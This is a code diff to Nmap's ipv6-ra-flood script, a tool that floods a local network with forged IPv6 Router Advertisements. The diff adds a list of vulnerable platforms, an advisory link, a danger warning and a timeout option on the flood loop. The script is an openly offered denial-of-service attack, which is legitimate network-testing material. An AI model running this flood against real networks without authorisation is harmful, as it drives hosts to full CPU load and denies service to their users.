@@ -5,16 +5,35 @@ local math = require "math"
 local string = require "string"
 local os = require "os"
 
-description = [[ Generates a flood of Router Adverisments (RA) with randomized source MAC address and annouced IPv6 prefixes causing machines to be DoSed.
+description = [[ Generates a flood of Router Adverisments (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS), 
+will start to compute IPv6 suffix and update their routing table to reflect the accepted annoucement. This will cause 100% CPU usage, thus preventing to process other application requests.
+
+Vulnerable platforms:
+  * All Cisco IOS ASA with firmware < November 2010
+  * All Netscreen versions supporting IPv6
+  * Windows 2000/XP/2003/Vista/7/2008/8/2012 
+  * All FreeBSD versions
+  * All NetBSD versions
+  * All Solaris/Illumos versions 
+
+Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
+
+WARNING: This script is dangerous and is very likely to bring down a server or network appliance. 
+It should not be run in a production environment unless you (and, more importantly,
+the business) understand the risks! 
+
+Additional documents: https://tools.ietf.org/rfc/rfc6104.txt
 ]]
 
 ---
 -- @args
 -- ipv6-ra-flood.interface defines interface we should broadcast on
+-- ipv6-ra-flood.timeout runs the script until the timeout (in seconds) is reached (default: 30s). If timeout is zero, the script will run forever.
 --
 -- @usage
 -- nmap -6 --script ipv6-ra-flood.nse
 -- nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>'
+-- nmap -6 --script ipv6-ra-flood.nse --script-args 'interface=<interface>,timeout=10'
 
 author = "Adam Števko"
 license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
@@ -46,7 +65,7 @@ end
 local function get_interface()
 	local arg_interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface")
 
-	local if_table = try(nmap.get_interface_info(arg_interface))
+	local if_table = nmap.get_interface_info(arg_interface)
 	
 	if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
 			return if_table.device
@@ -108,7 +127,12 @@ end
 --- Broadcasting on the selected interface
 -- @param iface table containing interface information 
 local function broadcast_on_interface(iface)
-	stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface" .. iface)
+	stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface " .. iface)
+
+	-- packet counter
+	local counter = 0
+
+	local arg_timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME..".timeout")) or 30
 
 	local dnet = nmap.new_dnet()
 
@@ -124,6 +148,8 @@ local function broadcast_on_interface(iface)
 	local preffered_time = tonumber(0xffffffff) 
 	
 	local mtu = 1500
+
+	local start, stop = os.time()
 
 	while true do
 
@@ -145,6 +171,17 @@ local function broadcast_on_interface(iface)
 		packet:build_ether_frame()
 
 		try(dnet:ethernet_send(packet.frame_buf))
+
+		counter = counter + 1
+
+		if arg_timeout and arg_timeout > 0 and arg_timeout <= os.time() - start then
+			stop = os.time()
+			break
+		end
+	end
+
+	if counter > 0 then
+		stdnse.print_debug("%s generated %d packets in %d seconds.", SCRIPT_NAME, counter, stop - start)
 	end
 end
 
